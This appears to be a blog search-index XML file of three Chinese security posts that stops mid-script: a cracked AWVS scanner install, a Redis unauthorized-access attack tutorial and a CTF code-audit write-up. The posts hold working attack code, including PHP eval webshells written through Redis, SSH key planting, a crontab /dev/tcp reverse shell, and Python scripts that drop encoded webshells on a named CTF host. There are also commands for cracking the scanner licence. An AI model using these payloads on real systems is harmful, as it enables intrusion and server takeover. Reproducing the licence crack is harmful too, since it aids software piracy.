<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>漏扫工具-AWVS</title>
    <link href="/posts/2175665633/"/>
    <url>/posts/2175665633/</url>
    
    <content type="html"><![CDATA[<p>user:<a href="mailto:&#x61;&#116;&#x6b;&#x78;&#54;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;">&#x61;&#116;&#x6b;&#x78;&#54;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;</a></p><p>Passwd:<a href="mailto:&#97;&#116;&#107;&#x78;&#x36;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;">&#97;&#116;&#107;&#x78;&#x36;&#64;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;</a></p><p>Kali2020.1安装AWVS12 详细过程</p><p>百度网盘链接：<a href="https://pan.baidu.com/s/167SkNggGGOyA9Ii7GmBWpQ">https://pan.baidu.com/s/167SkNggGGOyA9Ii7GmBWpQ</a></p><p>提取码：rlgt</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>1、下载解压文件后将下图文件夹复制到kali的桌面下</p><p>2、进入桌面文件夹所在位置，上级进入文件夹</p><p>3、打开后在此界面打开终端</p><p>4、执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> 777 acunetix_trial.sh patch_awvs<br>sudo ./acunetix_trial.sh<br></code></pre></td></tr></table></figure><p>5、按下enter继续。之后会显示其他信息，可以点击空格显示更多，可以点击q键跳过。在询问是否同意安装条款点击yes</p><p>6、emali和password后面会需要到。这里不需要真实的emali，密码为大写字母、小写字母、数字和特殊字符的组合</p><p>7、安装成功</p><p>8、上面要求访问kali_awvs:13443/。在访问之前，先进行安装破解补丁。命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cp</span> -a patch_awvs /home/acunetix/.acunetix_trial/v_190325161/scanner/<br>sudo <span class="hljs-built_in">chmod</span> 777 /home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs<br>sudo /home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs<br></code></pre></td></tr></table></figure><p>为防止破解失效执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo chattr +i /home/acunetix/.acunetix_trial/data/license/license_info.json<br>sudo <span class="hljs-built_in">rm</span> -fr /home/acunetix/.acunetix_trial/data/license/wa_data.dat<br>sudo <span class="hljs-built_in">touch</span> /home/acunetix/.acunetix_trial/data/license/wa_data.dat<br>sudo chattr +i /home/acunetix/.acunetix_trial/data/license/wa_data.dat<br></code></pre></td></tr></table></figure><p>重启acunetix服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl restart acunetix_trial.service<br></code></pre></td></tr></table></figure><p>9、实验kali的浏览器访问https:127.0.0.1:13443/。开始可能会出现安全警告，不用担心，继续访问，可以看到如下界面。输入刚刚注册的邮箱和密码</p><p>10、进入acunetix里</p><p>11、 点击右上角的Administrator—&gt;Profile，下拉可以看到license。看到由于安装破解补丁，限制时间为2099年，用户不限。</p><p>12、点击左边setting，选择不要自动更新。大功告成！</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="扫描测试网站"><a href="#扫描测试网站" class="headerlink" title="扫描测试网站"></a>扫描测试网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">AWVS官方提供的测试网站：<br>http://testhtml5.vulnweb.com<br>http://testphp.vulnweb.com<br>http://testasp.vulnweb.com<br>ibm提供的测试网站：<br>http://testfire.net<br></code></pre></td></tr></table></figure><h3 id="添加Target"><a href="#添加Target" class="headerlink" title="添加Target"></a>添加Target</h3><p>填写目标的域名或者IP</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780502679-787de1ec-61f2-4787-be04-ddcf02c86cd2.png" alt="img"></p><p>第二栏添加描述，如果是扫描工程，可以填上日期本次扫描的目的等等。</p><p>下一步</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780558544-ab505141-9264-4dc5-b16b-64173b92d8e9.png" alt="img"></p><p>下一半</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641780584157-6c1130c7-6a56-4727-91f4-f541c3811a7a.png" alt="img"></p><h3 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h3><p>点击左侧Vulnerabilities将展示扫描出来的漏洞列表。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781063551-515fbdbb-cff8-4330-b3b8-fce36fc971b0.png" alt="img"></p><p>漏洞的颜色红、黄、蓝、绿分别对应高、中、低、无风险漏洞四种类型。<br>也可以点击右侧的过滤按钮对结果进行筛选。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781112371-4aad2a7c-b599-4829-9310-43fccf90c1ce.png" alt="img"></p><p>点击每个漏洞条目，会列出该漏洞的详细信息</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781211796-415b20ec-eb7b-44a0-9b8d-916d2d35f521.png" alt="img"></p><h3 id="Scans"><a href="#Scans" class="headerlink" title="Scans"></a>Scans</h3><p>点击 Scans展示扫描的结果</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781398890-0e7aa638-4f86-4fcc-8bcd-ef87b8734cb0.png" alt="img"></p><p>点进连接可以显示扫描用时和进度</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781458741-523379a0-d3db-48d6-bc02-5ceaf116ee21.png" alt="img"></p><p>点击Generate Report会生成扫描报告，系统也给我们提供了一些扫描报告模板。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781491936-8b7cfbe2-9c05-4f31-8d3c-ce5fafdb44d4.png" alt="img"></p><h3 id="Reports"><a href="#Reports" class="headerlink" title="Reports"></a>Reports</h3><p>Reports主要展示一些生成的扫描报告，可以点击右侧的download按钮下载对应的扫描报告。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1641781595415-275de22b-e3fb-42e9-8f6e-10b977998cfc.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏扫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis未授权访问漏洞</title>
    <link href="/posts/2438404492/"/>
    <url>/posts/2438404492/</url>
    
    <content type="html"><![CDATA[<h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ol><li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li><li>没有设置密码认证（一般为空）或者设置弱口令密码，导致任何用户可以远程登录redis服务。</li></ol><p>意思大概就是，由于管理者配置不当，导致任何人都可以（通过redis客户端）登录他的redis服务，然后搞事情。 比如删数据、写入一句话木马、上传公钥登录ssh服务、反弹shell</p><p><strong>管理者如何配置不当？</strong></p><ol><li>没有设置密码，或者设置密码为弱口令</li><li>没有开启防火墙</li><li>将6379端口直接暴露在公网上，允许任何人访问</li><li>将将protected-mode设置为no，把保护关掉。</li><li>用管理员身份运行redis服务</li></ol><h2 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">靶机：centos6.<span class="hljs-number">5</span><br>靶机地址：<br>攻击机：kali<br>连接工具：finallshell<br></code></pre></td></tr></table></figure><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p><strong>centos靶机上安装redis</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">wget http:<span class="hljs-comment">//download.redis.io/releases/redis-3.2.0.tar.gz</span><br>tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz<br>cd redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span><br>make<br><br>cd src/ <span class="hljs-comment">#进入src目录 </span><br>cp redis-server /usr/bin/ <span class="hljs-comment">#将redis-server拷贝到/usr/bin目录下</span><br>cd ..   <span class="hljs-comment"># 返回上一级目录</span><br>cp redis.conf /etc/     <span class="hljs-comment">#将redis.conf拷贝到/etc/目录下</span><br>redis-server /etc/redis.conf  <span class="hljs-comment"># 使用/etc/目录下的redis.conf文件中的配置启动redis服务</span><br><br><br>  修改配置文件，使可以远程访问：<br>  vim redis.conf<br>bind <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>前面加上<span class="hljs-comment">#号 protected-mode设为no</span><br></code></pre></td></tr></table></figure><p>启动redis-server：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">./src/redis-server redis.conf<br>  <br>/etc/init.d/redis-server stop        <span class="hljs-comment">#关闭</span><br>/etc/init.d/redis-server start         <span class="hljs-comment">#启动</span><br>/etc/init.d/redis-server restart        <span class="hljs-comment">#重启</span><br></code></pre></td></tr></table></figure><p>默认的配置是使用6379端口，没有密码。这时候会导致未授权访问然后使用redis权限写文件。</p><p><strong>kali安装redis-cli远程连接工具</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">wget http:<span class="hljs-comment">//download.redis.io/redis-stable.tar.gz</span><br>tar -zxvf redis-stable.tar.gz<br>cd redis-stable<br>make <br>cp src/redis-cli /usr/bin/<br></code></pre></td></tr></table></figure><p>使用redis-cli命令直接远程免密登录redis主机</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">redis-cli -h 目标主机IP<br></code></pre></td></tr></table></figure><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>知识点</p><p>命令：CONFIG GET dir</p><p>获取数据库的存储路径（文件将会保存的地方,当然可以使用SET进行设置，如果有权限的话）</p><p>命令：CONFIG GET dbfilename</p><p>获取数据库文件名，默认是dump.rdb（通过SET设置为webshell.php等任意文件格式，然后利用）</p><p>命令：SAVE</p><p>保存当前数据库（将数据库内的内容写到文件中，上面给出了文件的路径和名称）</p><h3 id="利用1：获取web服务的webshell"><a href="#利用1：获取web服务的webshell" class="headerlink" title="利用1：获取web服务的webshell"></a>利用1：获取web服务的webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">182.130</span><br>  <br>set one <span class="hljs-string">&quot;\n\n\n&lt;?php @eval(<span class="hljs-subst">$_POST</span>[&#x27;c&#x27;]);?&gt;\n\n\n&quot;</span><br>  <br>config set dir  /<span class="hljs-keyword">var</span>/www/html<br>  <br>config set dbfilename shell.php<br>  <br>save<br></code></pre></td></tr></table></figure><p>shell地址：<a href="http://192.168.182.130/shell.php">http://192.168.182.130/shell.php</a></p><h3 id="利用2：写ssh-keygen公钥登录服务器"><a href="#利用2：写ssh-keygen公钥登录服务器" class="headerlink" title="利用2：写ssh-keygen公钥登录服务器"></a>利用2：写ssh-keygen公钥登录服务器</h3><p>在以下条件下，可以利用此方法</p><ul><li>Redis服务使用ROOT账号启动</li><li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li></ul><p>注:靶机是否设置了密码</p><p>首先在本地生成一对密钥：<br>1、生成公钥密钥文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ssh-keygen -t rsa<br></code></pre></td></tr></table></figure><p>2.导入公钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>;cat id_rsa.pub;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>)&gt;key.txt<br></code></pre></td></tr></table></figure><p>将公钥的内容重定向到test.txt文件里，以\n\n（相当于回车）隔开</p><p>3、发送公钥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cat key.txt | redis-cli -h ip -x set crackit<br></code></pre></td></tr></table></figure><p>或者直接复制公钥，连接redis执行下面的命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">192.168</span>.xxx.xxx&gt; config set dir /root/.ssh/<br>OK<br><span class="hljs-number">192.168</span>.xxx.xxx&gt; config set dbfilename authorized_keys<br>OK<br><span class="hljs-number">192.168</span>.xxx.xxx&gt; set x <span class="hljs-string">&quot;\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\n\n\n&quot;</span><br>OK<br><span class="hljs-number">192.168</span>.xxx.xxx&gt; save<br>OK<br></code></pre></td></tr></table></figure><p>4、利用公钥登录ssh</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ssh root@<span class="hljs-number">192.168</span>.<span class="hljs-number">182.130</span><br></code></pre></td></tr></table></figure><h3 id="利用3：定时任务反弹shell"><a href="#利用3：定时任务反弹shell" class="headerlink" title="利用3：定时任务反弹shell"></a>利用3：定时任务反弹shell</h3><p>在redis以root权限运行时可以写crontab来执行命令反弹shell<br>原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名。<br>首先在客户端这边<a href="https://so.csdn.net/so/search?q=%E7%9B%91%E5%90%AC&spm=1001.2101.3001.7020">监听</a>一个端口（随便一个端口就好，不要冲突就好）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">nc -lvp <span class="hljs-number">8888</span> <span class="hljs-comment">#监听8888端口</span><br><br><br>  <br>redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">182.130</span><br><br><span class="hljs-comment">//写入反弹命令</span><br>set xxx <span class="hljs-string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.182.130/8888 0&gt;&amp;1\n\n&quot;</span><br>config set dir /<span class="hljs-keyword">var</span>/spool/cron/crontabs/<br>config set dbfilename root<br>save<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码审计简历系统</title>
    <link href="/posts/7231741/"/>
    <url>/posts/7231741/</url>
    
    <content type="html"><![CDATA[<h2 id="简历系统"><a href="#简历系统" class="headerlink" title="简历系统"></a>简历系统</h2><p>2019防灾科技学院 “应急挑战杯” 大学生网络安全邀请赛 AWD 靶机题目</p><p><a href="https://github.com/GinkgoTeam/YJTZB_2019/blob/master/easyWEB/writeup.pdf">https://github.com/GinkgoTeam/YJTZB_2019/blob/master/easyWEB/writeup.pdf</a></p><p>//隐藏个功能 嘿嘿 直接根据名字测试简历分数！ //考察你们是用工具扫 还是自己审计代码了！<br> <img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1642159250274-5a33114f-ae65-4bee-9875-d11a66153036.png" alt="img"></p><p>源码泄露<a href="http://www.zip,/">www.zip，</a></p><p>D盾扫出来四个可疑文件</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1658762425161-4c7c4b5a-439c-4298-a45d-a36e9eb0b304.png" alt="img"></p><p>Seay源码审计</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1658765939545-afa08675-b0be-4f86-9d23-f5056403e51c.png" alt="img"></p><h3 id="后门1-shell-php"><a href="#后门1-shell-php" class="headerlink" title="后门1-shell.php"></a>后门1-shell.php</h3><p>路径：/var/www/html/include/shell.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin_ccmd&#x27;</span>]);<br>?&gt;<br></code></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/include/shell.php<br><br>POST:admin_ccmd=system(<span class="hljs-string">&#x27;cat  /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://www.bmzclub.cn:20111/include/shell.php&quot;</span><br>passwd=<span class="hljs-string">&quot;admin_ccmd&quot;</span><br>payload = &#123;passwd: <span class="hljs-string">&#x27;system(\&#x27;cat /f*\&#x27;);&#x27;</span>&#125;<br>res=requests.post(url,payload)<br><span class="hljs-built_in">print</span>(res.text)<br><span class="hljs-comment"># BMZCTF&#123;51489b4976824ad2b0e01dba3754c5bf&#125;</span><br></code></pre></td></tr></table></figure><p>写shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://www.bmzclub.cn:20111/&quot;</span><br><br>shell_path = url + <span class="hljs-string">&quot;/include/shell.php&quot;</span><br>shell_passwd = <span class="hljs-string">&quot;admin_ccmd&quot;</span><br><br><span class="hljs-comment">#利用预留后门</span><br>payload = &#123;shell_passwd: <span class="hljs-string">&#x27;system(\&#x27;find / -name &quot;atkx*&quot; \&#x27;);&#x27;</span>&#125;<br>res = requests.post(shell_path, payload)<br><span class="hljs-built_in">print</span>(res.text)<br><br><br><span class="hljs-comment"># payload1利用预留后门上传shell</span><br><span class="hljs-comment"># payload1 = &#123;shell_passwd: &#x27;system(\&#x27;echo &quot;&lt;?php @eval(\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx2.php\&#x27;);&#x27;&#125;</span><br><span class="hljs-comment"># payload1 = &#123;shell_passwd: &#x27;system(\&#x27;echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; /var/www/html/atkx2.php\&#x27;);&#x27;&#125;</span><br>payload1 = &#123;shell_passwd: <span class="hljs-string">&#x27;system(\&#x27;echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; /var/www/html/atkx3.php\&#x27;);&#x27;</span>&#125;<br>res = requests.post(shell_path, payload1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;shell已上传&quot;</span>)<br><br><span class="hljs-comment"># #payload2利用预留后门上传shell，并getflag</span><br>my_shell_path = url + <span class="hljs-string">&quot;/atkx3.php&quot;</span><br>my_shell_passwd = <span class="hljs-string">&quot;123&quot;</span><br>payload2 = &#123;my_shell_passwd: <span class="hljs-string">&#x27;system(\&#x27;cat /f*\&#x27;);&#x27;</span>&#125;<br>res = requests.post(my_shell_path, payload2)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h3 id="后门2-log-php"><a href="#后门2-log-php" class="headerlink" title="后门2-log.php"></a>后门2-log.php</h3><p>路径：/var/www/html/log.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// $path = &quot;/var/www/html/log.txt&quot;;</span><br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;/var/www/html/log.php&quot;</span>;<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$path</span>,<span class="hljs-string">&quot;a+&quot;</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;IP &quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>].<span class="hljs-string">&quot; url:&quot;</span>.<span class="hljs-string">&#x27;http://&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>].<span class="hljs-string">&quot; &quot;</span>;<br><span class="hljs-variable">$str</span> .= <span class="hljs-string">&quot;Gets:&quot;</span>.<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$_GET</span>).<span class="hljs-string">&quot; POST:&quot;</span>.<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$_POST</span>).<span class="hljs-string">&quot; COOKIE:&quot;</span>.<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$_COOKIE</span>).<span class="hljs-string">&quot;HEADER: &quot;</span>.<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$_SERVER</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>log.php记录访问日志，所以传入php代码可被log.php记录，导致getshell！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure><p>蚁剑连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://www.bmzclub.cn:20111/log.php<br>passwd=cmd<br></code></pre></td></tr></table></figure><p>连接成功</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/12572139/1642160342751-2a8f1dd5-285b-4948-921a-11f742bf0de5.png" alt="img"></p><p>自动getshell脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs plain">import requests<br><br>url = &quot;http://www.bmzclub.cn:20111&quot;<br><br>shell_path = url + &quot;/include/shell.php&quot;<br>shell_passwd = &quot;admin_ccmd&quot;<br><br>#利用预留后门<br>payload = &#123;shell_passwd: &#x27;system(\&#x27;ls /var/www/html\&#x27;);&#x27;&#125;<br>res = requests.post(shell_path, payload)<br>print(res.text)<br><br><br># payload1利用预留后门上传shell<br>payload1 = &#123;shell_passwd: &#x27;system(\&#x27;echo &quot;&lt;?php @eval(\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx2.php\&#x27;);&#x27;&#125;<br># payload1 = &#123;shell_passwd: &#x27;system(\&#x27;echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; /var/www/html/atkx2.php\&#x27;);&#x27;&#125;<br># payload1 = &#123;shell_passwd: &#x27;system(\&#x27;echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; /var/www/html/atkx3.php\&#x27;);&#x27;&#125;<br># payload1 = &#123;shell_passwd: &#x27;system(\&#x27;echo PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOyA/Pg==|base64 -d &gt; /var/www/html/atkx2.php\&#x27;);&#x27;&#125;<br>#payload1 = &#123;shell_passwd: &#x27;system(\&#x27;echo PD9waHAKZWNobyAnaGVsbG8nOwppZihtZDUoJF9QT1NUWydwYXNzJ10pPT0nNDYyZDRhMGU3Y2VkZDZiMDI0YTRkOTlmMTBjNjE0ZDEnKQppZiAoQCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSA9PSAnZmxhZycpewokdGVzdD0gJ2ZsYWcnOwpoZWFkZXIoImZsYWc6JHRlc3QiKTsKfQpAZXZhbCgkX1BPU1RbMV0pOwo/Pg==|base64 -d &gt; /var/www/html/atkx5.php\&#x27;);&#x27;&#125;<br># payload1 = &#123;shell_passwd: &#x27;system(\&#x27;echo IyEvYmluL2Jhc2gKZWNobyAidGVzdCIgPi92YXIvd3d3L2h0bWwvc2gudHh0Cg==|base64 -d &gt; /var/www/html/1.sh\&#x27;);&#x27;&#125;<br>res = requests.post(shell_path, payload1)<br><br><br><br>print(&quot;shell已上传&quot;)<br><br># #payload2利用预留后门上传shell，并getflag<br><br># my_shell_path = url + &quot;/atkx5.php&quot;<br># my_shell_passwd = &quot;cmd&quot;<br># headers=&#123;&#125;<br># payload2 = &#123;my_shell_passwd: &#x27;system(\&#x27;cat /f*\&#x27;);&#x27;&#125;<br># res = requests.post(my_shell_path, payload2)<br># print(res.text)<br><br><br>#1.sh<br>#!/bin/bash<br># echo &quot;&lt;?php 